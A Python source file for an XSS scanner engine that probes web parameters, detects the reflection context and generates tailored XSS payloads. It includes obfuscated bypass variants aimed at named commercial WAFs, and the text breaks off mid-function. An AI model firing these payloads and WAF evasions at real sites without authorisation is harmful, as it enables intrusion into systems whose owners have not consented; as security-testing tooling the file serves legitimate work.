"""
XSS Detection Engine — Dalfox-inspired probe-first approach.

Redesigned as a clean orchestrator that delegates to specialized modules:
  - Injector:       HTTP payload delivery (GET/POST/JSON/header/cookie/path + CSRF)
  - ContextAnalyzer: HTML-parser-based reflection context detection
  - PayloadGenerator: Dynamic payload generation from probe results
  - Verifier:        Multi-step verification (reflection + browser execution)
  - ConfidenceScorer: Unified evidence-based scoring

Pipeline per parameter:
  1. PROBE  — send unique harmless string, analyze reflection + encoding
  2. ANALYZE — detect context, available chars, quote type
  3. GENERATE — build context-specific payloads
  4. INJECT  — send each payload
  5. VERIFY  — multi-step: marker check → raw reflection → re-verify → browser
  6. SCORE   — calculate confidence from accumulated evidence
"""

import re
import time
import json
import copy
import random
import string
import threading
import uuid
import logging
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
from typing import List, Dict, Optional

from akha.modules.xss.injector import Injector
from akha.modules.xss.context_analyzer import ContextAnalyzer, ContextType
from akha.modules.xss.verifier import Verifier
from akha.modules.xss.execution_verifier import ExecutionVerifier
from akha.modules.xss.scoring import ConfidenceScorer, Severity
from akha.modules.xss.csp_analyzer import CSPAnalyzer
from akha.modules.xss.blind_xss import BlindXSSInjector
from akha.modules.xss.html_diff_engine import HTMLDiffEngine
from akha.payloads.generator import PayloadGenerator
from akha.payloads.encoder import PayloadEncoder
from akha.payloads.mutator import PayloadMutator
from akha.payloads.planner import PayloadPlanner
from akha.smart_layer.payload_engine import SmartPayloadEngine
from akha.smart_layer.validator import SmartValidator


logger = logging.getLogger("akha.xss_engine")


def _generate_probe_id() -> str:
    """Generate a unique probe string that won't appear naturally in HTML."""
    rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"akhaPROBE{rand}"


class XSSEngine:
    """
    Advanced XSS detection engine — clean orchestrator.

    External API (used by scanner.py):
      - scan(url, parameters, waf_name, session) → List[Dict]
      - check_stored_xss(crawled_urls) → List[Dict]
      - stop() / pause() / resume()
      - cleanup()
      - payloads_tested: int
      - blind_injector: BlindXSSInjector | None
    """

    def __init__(self, http_client, payload_manager, learning_engine, config):
        self.client = http_client
        self.payload_manager = payload_manager
        self.learning_engine = learning_engine
        self.config = config

        self.injector = Injector(http_client, config)
        self.context_analyzer = ContextAnalyzer()
        self.payload_generator = PayloadGenerator()
        self._verify_marker = f"akha{uuid.uuid4().hex[:10]}"
        self.verifier = Verifier(config, marker=self._verify_marker)
        self.execution_verifier = None
        self.execution_verifier_firefox = None
        self._execution_timeout_ms = getattr(config, 'timeout', 10) * 1000
        self.scorer = ConfidenceScorer()
        self.csp_analyzer = CSPAnalyzer(http_client)
        self.encoder = PayloadEncoder()
        self.payload_mutator = PayloadMutator()
        self.smart_payload_engine = SmartPayloadEngine(self.payload_generator, self.payload_mutator)
        self.smart_validator = SmartValidator()
        self.payload_planner = PayloadPlanner()
        self.diff_engine = HTMLDiffEngine()

        self.payloads_tested = 0
        self._payloads_tested_lock = threading.Lock()
        self.candidates_detected = 0
        self.filtered_low_confidence = 0
        self.filtered_unverified = 0

        self._paused = False
        self._stopped = False

        self._injected_payloads = []
        self._injected_lock = threading.Lock()

        self.blind_injector = None
        if config.collaborator_url:
            self.blind_injector = BlindXSSInjector(
                collaborator_url=config.collaborator_url,
                output_dir=config.output_dir,
            )

        self._csp_cache = {}
        self._csp_lock = threading.Lock()
    
    def stop(self):
        """Stop scanning"""
        self._stopped = True
    
    def pause(self):
        """Pause scanning"""
        self._paused = True
    
    def resume(self):
        """Resume scanning"""
        self._paused = False
    
    def _check_stop_pause(self) -> bool:
        """Check stop/pause flags. Returns True if should stop."""
        if self._stopped:
            return True
        while self._paused:
            time.sleep(0.5)
            if self._stopped:
                return True
        return False
    
    
    def _post_follow_redirect(self, response, base_url: str, check_text: Optional[str] = None):
        """If POST response is a redirect and check_text not found, follow the redirect.
        
        Many forms POST → 302 → GET /result. The payload may be reflected in either
        the POST response body OR the redirect target. This method checks both.
        
        Returns the best response (the one containing check_text, or the redirect target).
        """
        if response.status_code not in (301, 302, 303, 307, 308):
            return response
        
        if check_text and check_text in response.text:
            return response
        
        redirect_url = response.headers.get('Location', '').strip()
        if not redirect_url:
            return response
        
        redirect_url = urljoin(base_url, redirect_url)
        if not redirect_url.startswith(('http://', 'https://')):
            return response

        try:
            base_host = urlparse(base_url).netloc.lower()
            redirect_host = urlparse(redirect_url).netloc.lower()
            if base_host and redirect_host and base_host != redirect_host:
                return response
        except Exception as exc:
            logger.debug("Redirect host validation failed", exc_info=True)
            return response
        
        try:
            return self.client.get(redirect_url)
        except Exception as exc:
            logger.debug("Redirect follow request failed", exc_info=True)
            return response
    
    
    def _send_probe(self, url: str, param_name: str, location: str,
                    param_context: Optional[Dict] = None) -> Optional[Dict]:
        """
        Send a harmless probe to check reflection behavior.
        
        Returns dict with:
          - reflected: bool
          - probe_id: the unique string we sent
          - chars: dict of special char -> 'raw' | 'encoded' | 'removed'
          - context: detected context info
          - response: the response object
        """
        probe_id = _generate_probe_id()
        
        special_chars = '<>"\'`()/'
        probe_string = f"{probe_id}{special_chars}"
        
        test_url = self._build_test_url(url, param_name, probe_string, location)
        with self._payloads_tested_lock:
            self.payloads_tested += 1
        
        try:
            if location == 'json_body':
                api_url = url
                json_template = {}
                if param_context:
                    api_url = param_context.get('form_action', url)
                    json_template = copy.deepcopy(param_context.get('json_body', {}))
                json_template[param_name] = probe_string
                response = self.client.post_json(api_url, json_data=json_template, allow_redirects=False)
                response = self._post_follow_redirect(response, api_url, probe_id)
            elif location == 'POST':
                form_action = url
                post_data = {}
                
                if param_context:
                    form_action = param_context.get('form_action', url)
                    form_inputs = param_context.get('form_inputs', {})
                    post_data = dict(form_inputs)
                else:
                    parsed = urlparse(url)
                    form_action = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                
                post_data[param_name] = probe_string
                response = self.client.post(form_action, data=post_data, allow_redirects=False)
                response = self._post_follow_redirect(response, form_action, probe_id)
            elif location == 'header':
                response = self.client.get(url, headers={param_name: probe_string})
                test_url = url
            elif location == 'cookie':
                response = self.client.get(url, cookies={param_name: probe_string})
                test_url = url
            elif location == 'path':
                path_index = param_context.get('path_index', 0) if param_context else 0
                test_url = self._build_path_url(url, path_index, probe_string)
                response = self.client.get(test_url)
            else:
                effective_url = url
                if param_context and param_context.get('form_action'):
                    effective_url = param_context['form_action']
                test_url = self._build_test_url(effective_url, param_name, probe_string, location)
                response = self.client.get(test_url)
            
            content_type = response.headers.get('Content-Type', '').lower()
            if content_type and not any(ct in content_type for ct in ['text/html', 'application/xhtml', 'text/xml', 'text/plain']):
                if 'text/' not in content_type and 'html' not in content_type:
                    return None
            
            body = response.text
            
            if probe_id not in body:
                return None
            
            positions = []
            search_start = 0
            while True:
                pos = body.find(probe_id, search_start)
                if pos == -1:
                    break
                positions.append(pos)
                search_start = pos + 1
            
            if not positions:
                return None
            
            encoded_forms = {
                '<': ['&lt;', '&#60;', '&#x3c;', '&#x3C;'],
                '>': ['&gt;', '&#62;', '&#x3e;', '&#x3E;'],
                '"': ['&quot;', '&#34;', '&#x22;'],
                "'": ['&#39;', '&#x27;', '&apos;'],
                '`': ['&#96;', '&#x60;'],
                '(': ['&#40;', '&#x28;'],
                ')': ['&#41;', '&#x29;'],
                '/': ['&#47;', '&#x2f;', '&#x2F;'],
            }
            
            best_result = None
            best_score = -1
            
            for probe_pos in positions:
                char_status = {}
                after_probe = body[probe_pos + len(probe_id):probe_pos + len(probe_id) + 500]
                
                if not any(c in after_probe for c in '<>"\'`()/'):
                    wide_window = body[probe_pos:probe_pos + 2000]
                    if any(c in wide_window for c in '<>"\'`()/'):
                        after_probe = wide_window
                
                for char in special_chars:
                    if char in after_probe:
                        char_status[char] = 'raw'
                    else:
                        found_encoded = False
                        for enc in encoded_forms.get(char, []):
                            if enc in after_probe or enc.lower() in after_probe.lower():
                                char_status[char] = 'encoded'
                                found_encoded = True
                                break
                        if not found_encoded:
                            char_status[char] = 'removed'
                
                context = self._detect_probe_context(body, probe_id, probe_pos)
                
                score = sum(1 for c in '<>"\'`()/' if char_status.get(c) == 'raw')
                ctx_type = context['type']
                if ctx_type == 'javascript':
                    score += 5
                elif ctx_type == 'url':
                    score += 4
                elif ctx_type == 'attribute':
                    score += 3
                elif ctx_type == 'html':
                    score += 2
                elif ctx_type == 'comment':
                    score += 1
                
                if score > best_score:
                    best_score = score
                    best_result = {
                        'reflected': True,
                        'probe_id': probe_id,
                        'chars': char_status,
                        'context': ctx_type,
                        'quote_type': context.get('quote'),
                        'in_script': context.get('in_script', False),
                        'in_attribute': context.get('in_attribute', False),
                        'attr_name': context.get('attr_name'),
                        'response': response,
                        'reflection_count': len(positions),
                    }
            if best_result and not self._validate_probe_consistency(
                url, param_name, location, param_context, best_result['chars']
            ):
                return None

            return best_result
            
        except Exception as e:
            logger.debug("Probe send failed for %s@%s", param_name, location, exc_info=True)
            if getattr(self.config, 'verbose', False):
                import traceback
                traceback.print_exc()
            return None
    
    def _detect_probe_context(self, html: str, probe_id: str, pos: int) -> Dict:
        """Detect the context where the probe was reflected"""
        before = html[:pos]
        
        last_script_open = before.rfind('<script')
        last_script_close = before.rfind('</script')
        if last_script_open > last_script_close and last_script_open != -1:
            script_content = html[last_script_open:pos]
            quote = self._detect_string_context(script_content)
            return {
                'type': 'javascript',
                'quote': quote,
                'in_script': True,
                'in_attribute': False,
            }
        
        last_style_open = before.rfind('<style')
        last_style_close = before.rfind('</style')
        if last_style_open > last_style_close and last_style_open != -1:
            return {'type': 'css', 'in_script': False, 'in_attribute': False}
        
        last_tag_open = before.rfind('<')
        last_tag_close = before.rfind('>')
        if last_tag_open > last_tag_close and last_tag_open != -1:
            tag_content = html[last_tag_open:pos]
            
            attr_match = re.search(r'(\w+)\s*=\s*["\']?\s*$', tag_content)
            attr_name = attr_match.group(1) if attr_match else None
            
            quote = None
            if re.search(r'=\s*"[^"]*$', tag_content):
                quote = '"'
            elif re.search(r"=\s*'[^']*$", tag_content):
                quote = "'"
            
            if attr_name and attr_name.lower() in ('href', 'src', 'action', 'formaction', 'data', 'codebase'):
                return {
                    'type': 'url',
                    'quote': quote,
                    'in_script': False,
                    'in_attribute': True,
                    'attr_name': attr_name,
                }
            
            if attr_name and attr_name.lower().startswith('on'):
                return {
                    'type': 'javascript',
                    'quote': quote,
                    'in_script': False,
                    'in_attribute': True,
                    'attr_name': attr_name,
                }
            
            return {
                'type': 'attribute',
                'quote': quote,
                'in_script': False,
                'in_attribute': True,
                'attr_name': attr_name,
            }
        
        last_comment_open = before.rfind('<!--')
        last_comment_close = before.rfind('-->')
        if last_comment_open > last_comment_close and last_comment_open != -1:
            return {'type': 'comment', 'in_script': False, 'in_attribute': False}
        
        return {'type': 'html', 'in_script': False, 'in_attribute': False}
    
    def _detect_string_context(self, script_content: str) -> Optional[str]:
        """Detect if we're inside a JS string and which quote type"""
        in_string = None
        escaped = False
        for char in script_content:
            if escaped:
                escaped = False
                continue
            if char == '\\':
                escaped = True
                continue
            if in_string:
                if char == in_string:
                    in_string = None
            else:
                if char in ('"', "'", '`'):
                    in_string = char
        return in_string

    def _map_probe_context(self, probe_context: str) -> str:
        """Map probe context names to payload manager context names"""
        mapping = {
            'html': 'HTML',
            'attribute': 'Attribute',
            'javascript': 'JavaScript',
            'url': 'URL',
            'css': 'CSS',
            'comment': 'HTML',
        }
        return mapping.get(probe_context, 'HTML')

    def _classify_endpoint_profile(self, url: str, param_location: str) -> str:
        """Map URL+parameter location into a stable endpoint class for learning."""
        try:
            path = (urlparse(url).path or '').lower()
        except Exception:
            path = (url or '').lower()

        auth_tokens = ('/login', '/signin', '/sign-in', '/auth', '/session', '/token')
        write_tokens = ('create', 'update', 'delete', 'edit', 'save', 'submit', 'register', 'signup')

        if any(token in path for token in auth_tokens):
            return 'auth'
        if param_location in ('POST', 'json_body'):
            if '/api/' in path and any(token in path for token in write_tokens):
                return 'api_write'
            if '/api/' in path:
                return 'api_read'
            return 'default'
        if '/api/' in path:
            return 'api_read'
        return 'default'

    def _classify_failure_reason(self, probe_result: Dict, waf_name: Optional[str]) -> str:
        """Best-effort failure reason taxonomy used by the learning engine."""
        if waf_name:
            return 'blocked'

        chars = probe_result.get('chars', {}) or {}
        if not chars:
            return 'unknown'
        context = probe_result.get('context', 'html')

        critical_map = {
            'html': ('<', '>'),
            'attribute': ('"', "'", '<', '>'),
            'javascript': ('(', ')', '"', "'", '`'),
            'url': ('"', "'", ':', '('),
            'css': ('(', ')', '<', '>'),
            'comment': ('<', '>'),
        }
        critical = critical_map.get(context, ('<', '>', '(', ')'))

        if any(chars.get(ch) == 'removed' for ch in critical if ch in chars):
            return 'stripped'
        if any(chars.get(ch) == 'encoded' for ch in critical if ch in chars):
            return 'encoded'
        return 'inert'

    def _classify_encoding_profile(self, probe_result: Dict) -> str:
        """Compress character-encoding outcomes into a stable profile label."""
        chars = probe_result.get('chars', {}) or {}
        if not chars:
            return 'unknown'
        statuses = list(chars.values())
        if statuses and all(s == 'raw' for s in statuses):
            return 'raw'
        if statuses and all(s == 'encoded' for s in statuses):
            return 'encoded'
        if statuses and all(s == 'removed' for s in statuses):
            return 'stripped'
        if 'encoded' in statuses and 'raw' in statuses:
            return 'mixed'
        return 'partial'

    def _is_payload_compatible(self, payload: str, chars: Dict, context: str) -> bool:
        """Filter out payloads that require blocked characters for a given context.
        
        More lenient than before: only reject when critical chars for the payload
        type are definitely blocked. Allow payloads through when probe data is
        incomplete (e.g. chars dict is empty or missing keys).
        """
        if not payload:
            return False

        if not chars:
            return True
        
        if context in ('html', 'comment'):
            if '<' in payload and chars.get('<', 'raw') != 'raw':
                return False
            if '>' in payload and chars.get('>', 'raw') != 'raw':
                return False

        if context == 'attribute':
            if payload.startswith('"') and chars.get('"', 'raw') != 'raw':
                if '<' not in payload or chars.get('<', 'raw') != 'raw':
                    return False
            if payload.startswith("'") and chars.get("'", 'raw') != 'raw':
                if '<' not in payload or chars.get('<', 'raw') != 'raw':
                    return False

        if context == 'javascript':
            needs_call = any(fn in payload for fn in ('alert', 'confirm', 'prompt', 'eval'))
            if needs_call:
                paren_ok = (chars.get('(', 'raw') == 'raw' and chars.get(')', 'raw') == 'raw')
                backtick_ok = chars.get('`', 'raw') == 'raw'
                entity_call = '&lpar;' in payload or '&#40;' in payload or '&#x28;' in payload
                if not paren_ok and not backtick_ok and not entity_call:
                    return False
            if payload.startswith('"') and chars.get('"', 'raw') != 'raw':
                if '</script>' not in payload.lower():
                    return False
            if payload.startswith("'") and chars.get("'", 'raw') != 'raw':
                if '</script>' not in payload.lower():
                    return False

        return True

    def _dedupe_keep_order(self, payloads: List[str]) -> List[str]:
        """Remove semantically duplicate payloads while preserving order."""
        return self.payload_planner.dedupe(payloads)

    def _prioritize_payloads(self, payloads: List[str], learned_payloads: List[str]) -> List[str]:
        """Move historically successful payload families to the front."""
        return self.payload_planner.prioritize(payloads, learned_payloads)
    
    
    def _get_targeted_payloads(
        self,
        probe_result: Dict,
        waf_name: Optional[str] = None,
        url: str = "",
        param_name: str = "",
        param_location: str = 'GET',
    ) -> List[str]:
        """
        Generate payloads based on probe results.
        Only returns payloads that have a chance of working given the
        character filtering and context detected.
        
        Much larger payload set for thorough testing.
        """
        chars = probe_result['chars']
        context = probe_result['context']
        quote = probe_result['quote_type']
        
        payload_limit = self.payload_planner.budget(
            getattr(self.config, 'scan_profile', 'balanced'),
            self.config.deep_scan,
            self.config.aggressive_mode,
        )

        payloads = self.smart_payload_engine.generate(
            url=url,
            param=param_name,
            probe_result=probe_result,
            marker=self.verifier.verify_class,
            waf_name=waf_name,
            payload_limit=payload_limit,
            minimal_grammar=bool(getattr(self.config, 'payload_minimal_grammar', True)),
        )
        
        lt_raw = chars.get('<', 'removed') == 'raw'
        gt_raw = chars.get('>', 'removed') == 'raw'
        dquote_raw = chars.get('"', 'removed') == 'raw'
        squote_raw = chars.get("'", 'removed') == 'raw'
        paren_raw = chars.get('(', 'removed') == 'raw' and chars.get(')', 'removed') == 'raw'
        backtick_raw = chars.get('`', 'removed') == 'raw'
        slash_raw = chars.get('/', 'removed') == 'raw'
        
        if context == 'html':
            if lt_raw and gt_raw:
                if paren_raw:
                    payloads.extend([
                        f'<script {self.verifier.verify_class}>alert(1)</script>' if slash_raw else None,
                        f'<svg/onload=alert(1) {self.verifier.verify_class}>',
                        f'<img src=x onerror=alert(1) {self.verifier.verify_class}>',
                        f'<input onfocus=alert(1) autofocus {self.verifier.verify_class}>',
                        f'<details open ontoggle=alert(1) {self.verifier.verify_class}>',
                        f'<body onload=alert(1) {self.verifier.verify_class}>',
                        f'<marquee onstart=alert(1) {self.verifier.verify_class}>',
                    ])
                
                if backtick_raw:
                    payloads.extend([
                        f'<svg/onload=alert`1` {self.verifier.verify_class}>',
                        f'<img src=x onerror=alert`1` {self.verifier.verify_class}>',
                    ])
                
                if not paren_raw and not backtick_raw:
                    payloads.extend([
                        f'<svg/onload=alert&lpar;1&rpar; {self.verifier.verify_class}>',
                        f'<img src=x onerror=alert&#40;1&#41; {self.verifier.verify_class}>',
                    ])
                
                if paren_raw and slash_raw:
                    payloads.extend([
                        f'"><img src=x onerror=alert(1) {self.verifier.verify_class}>//',
                        f'</script><script {self.verifier.verify_class}>alert(1)</script>',
                    ])
        
        elif context == 'attribute':
            if quote == '"' and dquote_raw:
                if lt_raw and gt_raw:
                    if paren_raw:
                        payloads.extend([
                            f'"><svg/onload=alert(1) {self.verifier.verify_class}>',
                            f'"><img src=x onerror=alert(1) {self.verifier.verify_class}>',
                        ])
                        if slash_raw:
                            payloads.append(f'"><script {self.verifier.verify_class}>alert(1)</script>')
                    if backtick_raw:
                        payloads.append(f'"><svg/onload=alert`1` {self.verifier.verify_class}>')
                
                if paren_raw:
                    payloads.extend([
                        f'" autofocus onfocus=alert(1) {self.verifier.verify_class} x="',
                        f'" onmouseover=alert(1) {self.verifier.verify_class} x="',
                        f'" onclick=alert(1) {self.verifier.verify_class} x="',
                    ])
                if backtick_raw:
                    payloads.append(f'" autofocus onfocus=alert`1` {self.verifier.verify_class} x="')
            
            elif quote == "'" and squote_raw:
                if lt_raw and gt_raw:
                    if paren_raw:
                        payloads.extend([
                            f"'><svg/onload=alert(1) {self.verifier.verify_class}>",
                            f"'><img src=x onerror=alert(1) {self.verifier.verify_class}>",
                        ])
                        if slash_raw:
                            payloads.append(f"'><script {self.verifier.verify_class}>alert(1)</script>")
                    if backtick_raw:
                        payloads.append(f"'><svg/onload=alert`1` {self.verifier.verify_class}>")
                
                if paren_raw:
                    payloads.extend([
                        f"' autofocus onfocus=alert(1) {self.verifier.verify_class} x='",
                        f"' onmouseover=alert(1) {self.verifier.verify_class} x='",
                        f"' onclick=alert(1) {self.verifier.verify_class} x='",
                    ])
                if backtick_raw:
                    payloads.append(f"' autofocus onfocus=alert`1` {self.verifier.verify_class} x='")
            
            elif quote is None:
                if lt_raw and gt_raw:
                    if paren_raw:
                        payloads.extend([
                            f'><svg/onload=alert(1) {self.verifier.verify_class}>',
                            f'><img src=x onerror=alert(1) {self.verifier.verify_class}>',
                        ])
                    if backtick_raw:
                        payloads.append(f'><svg/onload=alert`1` {self.verifier.verify_class}>')
                if paren_raw:
                    payloads.extend([
                        f' autofocus onfocus=alert(1) {self.verifier.verify_class} ',
                        f' onmouseover=alert(1) {self.verifier.verify_class} ',
                    ])
                if backtick_raw:
                    payloads.append(f' autofocus onfocus=alert`1` {self.verifier.verify_class} ')
            
            if quote is None or (quote == '"' and not dquote_raw) or (quote == "'" and not squote_raw):
                if lt_raw and gt_raw and paren_raw:
                    payloads.extend([
                        f'><svg/onload=alert(1) {self.verifier.verify_class}><',
                    ])
        
        elif context == 'javascript':
            if probe_result.get('in_script'):
                if quote == '"' and dquote_raw:
                    if paren_raw:
                        payloads.extend([
                            '";alert(1)//',
                            '"+alert(1)//',
                            '"};alert(1)//',
                            '\\";alert(1)//',
                            '"-alert(1)-"',
                        ])
                    if lt_raw and gt_raw and slash_raw:
                        payloads.extend([
                            f'";</script><svg/onload=alert(1) {self.verifier.verify_class}>',
                            f'"</script><script {self.verifier.verify_class}>alert(1)</script>',
                        ])
                
                elif quote == "'" and squote_raw:
                    if paren_raw:
                        payloads.extend([
                            "';alert(1)//",
                            "'+alert(1)//",
                            "'};alert(1)//",
                            "\\\';alert(1)//",
                            "'-alert(1)-'",
                        ])
                    if lt_raw and gt_raw and slash_raw:
                        payloads.extend([
                            f"';</script><svg/onload=alert(1) {self.verifier.verify_class}>",
                            f"'</script><script {self.verifier.verify_class}>alert(1)</script>",
                        ])
                
                elif quote == '`' and backtick_raw:
                    payloads.extend([
                        '${alert(1)}',
                        '`;alert(1)//',
                    ])
                
                else:
                    if paren_raw:
                        payloads.extend([
                            'alert(1)',
                            ';alert(1)//',
                            '};alert(1)//',
                            '-alert(1)-',
                        ])
                    if lt_raw and gt_raw and slash_raw:
                        payloads.extend([
                            f'</script><svg/onload=alert(1) {self.verifier.verify_class}>',
                            f'</script><img src=x onerror=alert(1) {self.verifier.verify_class}>',
                        ])
            
            elif probe_result.get('in_attribute') and probe_result.get('attr_name', '').startswith('on'):
                if paren_raw:
                    payloads.extend([
                        'alert(1)',
                        ';alert(1)',
                    ])
        
        elif context == 'url':
            payloads.extend([
                'javascript:alert(1)',
                'JaVaScRiPt:alert(1)',
                'javascript:void(alert(1))',
                'data:text/html,<script>alert(1)</script>',
            ])
            if lt_raw and gt_raw:
                if quote == '"' and dquote_raw:
                    payloads.extend([
                        f'"><svg/onload=alert(1) {self.verifier.verify_class}>',
                        f'"><img src=x onerror=alert(1) {self.verifier.verify_class}>',
                    ])
                elif quote == "'" and squote_raw:
                    payloads.extend([
                        f"'><svg/onload=alert(1) {self.verifier.verify_class}>",
                        f"'><img src=x onerror=alert(1) {self.verifier.verify_class}>",
                    ])
        
        elif context == 'css':
            if paren_raw:
                payloads.extend([
                    f'</style><svg/onload=alert(1) {self.verifier.verify_class}>' if lt_raw and gt_raw and slash_raw else None,
                    f'</style><img src=x onerror=alert(1) {self.verifier.verify_class}>' if lt_raw and gt_raw and slash_raw else None,
                ])
            if paren_raw:
                payloads.extend([
                    'expression(alert(1))',
                    'expression(alert(document.domain))',
                ])
            payloads.extend([
                'url(javascript:alert(1))' if paren_raw else None,
            ])
            if dquote_raw or squote_raw:
                payloads.extend([
                    '@import url("javascript:alert(1)")' if dquote_raw and paren_raw else None,
                    "@import url('javascript:alert(1)')" if squote_raw and paren_raw else None,
                ])
            payloads = [p for p in payloads if p is not None]
        
        elif context == 'comment':
            if lt_raw and gt_raw:
                payloads.extend([
                    f'--><svg/onload=alert(1) {self.verifier.verify_class}>',
                    f'--><img src=x onerror=alert(1) {self.verifier.verify_class}>',
                ])
        
        payloads = [p for p in payloads if p is not None]


        universal_payloads = []
        if context in ('html', 'comment') and lt_raw and gt_raw:
            if paren_raw:
                universal_payloads.extend([
                    f'<script {self.verifier.verify_class}>alert(1)</script>',
                    f'<img src=x onerror=alert(1) {self.verifier.verify_class}>',
                    f'<svg onload=alert(1) {self.verifier.verify_class}>',
                ])
            elif backtick_raw:
                universal_payloads.extend([
                    f'<svg onload=alert`1` {self.verifier.verify_class}>',
                ])
        elif context == 'attribute':
            if dquote_raw and paren_raw:
                universal_payloads.extend([
                    f'" onfocus=alert(1) autofocus {self.verifier.verify_class} x="',
                    f'"><img src=x onerror=alert(1) {self.verifier.verify_class}>',
                ])
            elif squote_raw and paren_raw:
                universal_payloads.extend([
                    f"' onfocus=alert(1) autofocus {self.verifier.verify_class} x='",
                    f"'><img src=x onerror=alert(1) {self.verifier.verify_class}>",
                ])
        elif context == 'javascript':
            if paren_raw:
                universal_payloads.extend([
                    '";alert(1)//',
                    "';alert(1)//",
                ])
        
        payloads.extend(universal_payloads)

        learned_payloads = []
        if self.config.learning_enabled:
            endpoint_profile = None
            if getattr(self.config, 'payload_context_bandit', True):
                endpoint_profile = self._classify_endpoint_profile(url, param_location)
            encoding_profile = self._classify_encoding_profile(probe_result)
            learned_payloads = self.learning_engine.get_best_payloads_ucb(
                context=self._map_probe_context(context),
                waf_name=waf_name,
                limit=8,
                endpoint_profile=endpoint_profile,
                encoding_profile=encoding_profile,
                exploration=float(getattr(self.config, 'ucb_exploration_factor', 1.4) or 1.4),
            )
            payloads.extend(learned_payloads)

        if payloads:
            mutated = self.payload_mutator.mutate(
                payloads[:6],
                waf_name=waf_name,
                max_variants_per_payload=2,
            )
            payloads.extend(mutated)

        encode_strategy = getattr(self.config, 'encode_strategy', 'auto')
        if encode_strategy != 'none' and payloads:
            if encode_strategy == 'auto':
                if waf_name:
                    enc_names = self.encoder.get_waf_encoders(waf_name)
                else:
                    enc_names = []
            elif encode_strategy == 'all':
                enc_names = list(PayloadEncoder.__dict__.keys())  # apply_chain handles 'all'
                enc_names = ['all']
            else:
                enc_names = [encode_strategy]

            if enc_names:
                for p in payloads[:5]:
                    encoded_variants = self.encoder.apply_chain(p, enc_names)
                    payloads.extend(encoded_variants[:3])  # max 3 encoded variants per payload

        if self.config.deep_scan or self.config.aggressive_mode:
            manager_context = self._map_probe_context(context)
            manager_payloads = self.payload_manager.get_payloads(manager_context, waf_name)
            payloads.extend(manager_payloads)

        payloads = [
            p for p in payloads
            if self._is_payload_compatible(p, chars, context)
        ]
        payloads = self._dedupe_keep_order(payloads)
        payloads = self._prioritize_payloads(payloads, learned_payloads)

        return payloads[:payload_limit]
    
    def _apply_waf_bypass(self, payloads: List[str], waf_name: str) -> List[str]:
        """Generate WAF bypass variants of payloads.
        
        Produces at most 2 variants per input payload to keep request count low.
        Picks the most effective bypass technique for the detected WAF.
        """
        bypassed = []
        waf_lower = waf_name.lower() if waf_name else ''
        
        for p in payloads:
            variants_for_this = []
            
            if waf_lower == 'cloudflare':

                variants_for_this.append(
                    '<svg><animatetransform onbegin=alert(1) attributeName=transform>'
                )
                if 'alert(' in p:
                    variants_for_this.append(p.replace('alert(1)', '&#97;lert&#40;1&#41;'))
                if 'alert' in p:
                    variants_for_this.append(p.replace('alert', '\u0061lert'))
                if 'alert(1)' in p:
                    variants_for_this.append(p.replace('alert(1)', 'window["ale"+"rt"](1)'))
                if 'alert(1)' in p:
                    variants_for_this.append(
                        p.replace('alert(1)', '[]["constructor"]["constructor"]("alert(1)")()')
                    )
                if 'onerror=' in p:
                    variants_for_this.append(p.replace('onerror=', 'oNerRor='))
                elif 'onload=' in p:
                    variants_for_this.append(p.replace('onload=', 'oNloAd='))

            elif waf_lower == 'akamai':
                if 'alert(1)' in p:
                    variants_for_this.append(p.replace('alert(1)', '[1].find(alert)'))
                    variants_for_this.append(p.replace('alert(1)', 'top["al"+"ert"](1)'))
                if ' ' in p:
                    variants_for_this.append(p.replace(' ', '%09', 1))
                if 'onerror' in p:
                    variants_for_this.append(p.replace('onerror', 'on\x65rror'))

            elif waf_lower in ('imperva', 'incapsula'):
                if 'alert(' in p:
                    variants_for_this.append(p.replace('alert(', 'al\u0065rt('))
                    variants_for_this.append(p.replace('alert(1)', 'window.alert(1)'))
                if '<' in p:
                    variants_for_this.append(p.replace('<', '%253C', 1))

            elif waf_lower == 'sucuri':
                if 'alert(' in p:
                    variants_for_this.append(p.replace('alert(', 'al\u0065rt('))
                if 'script' in p.lower():
                    variants_for_this.append(
                        re.sub(r'script', 'scr\x69pt', p, flags=re.IGNORECASE)
                    )

            elif waf_lower in ('modsecurity', 'owasp'):
                if 'script' in p.lower():
                    variants_for_this.append(p.replace('script', 'scr<!---->ipt'))
                if 'alert(' in p:
                    variants_for_this.append(p.replace('alert(1)', 'ale\x72t(1)'))

            elif waf_lower in ('aws', 'awswaf', 'aws waf'):
                if 'alert(1)' in p:
                    variants_for_this.append(p.replace('alert(1)', 'eval(atob("YWxlcnQoMSk="))'))
                if 'onerror' in p:
                    variants_for_this.append(p.replace('onerror', 'on\u0065rror'))

            else:
                case_var = ''
                for i, c in enumerate(p):
                    case_var += c.upper() if i % 3 == 0 and c.isalpha() else c
                if case_var != p:
                    variants_for_this.append(case_var)
                if 'alert(' in p:
                    variants_for_this.append(p.replace('alert(1)', 'self["alert"](1)'))
                    variants_for_this.append(p.replace('alert(1)', 'window["ale"+"rt"](1)'))
                variants_for_this.append(
                    '<svg><animatetransform onbegin=alert(1) attributeName=transform>'
                )

            bypassed.extend(variants_for_this[:3])
        
        return bypassed
    
    
    def _verify_xss(self, url: str, param_name: str, payload: str,
                    location: str, param_context: Optional[Dict] = None,
                    baseline_html: Optional[str] = None) -> Optional[Dict]:
        """
        Send payload and verify it's actually rendered as HTML (not encoded).
        
        Anti-false-positive checks:
        - Check the FULL payload appears unencoded in response
        - If payload has verification marker (class=akha), verify it's in an actual tag
        - Check that critical XSS chars (<, >, on*=) are NOT HTML-encoded around the payload
        """
        test_url = self._build_test_url(url, param_name, payload, location)
        json_template: Dict = {}
        form_action: str = url
        
        try:
            if location == 'json_body':
                api_url = url
                json_template = {}
                if param_context:
                    api_url = param_context.get('form_action', url)
                    json_template = copy.deepcopy(param_context.get('json_body', {}))
                json_template[param_name] = payload
                response = self.client.post_json(api_url, json_data=json_template, allow_redirects=False)
                response = self._post_follow_redirect(response, api_url, payload)
                test_url = api_url
                _post_data_for_report = json_template
            elif location == 'POST':
                form_action = url
                post_data = {}
                
                if param_context:
                    form_action = param_context.get('form_action', url)
                    form_inputs = param_context.get('form_inputs', {})
                    post_data = dict(form_inputs)
                
                post_data[param_name] = payload
                response = self.client.post(form_action, data=post_data, allow_redirects=False)
                response = self._post_follow_redirect(response, form_action, payload)
                test_url = form_action
                _post_data_for_report = dict(post_data)
            elif location == 'header':
                response = self.client.get(url, headers={param_name: payload})
                test_url = url
                _post_data_for_report = None
            elif location == 'cookie':
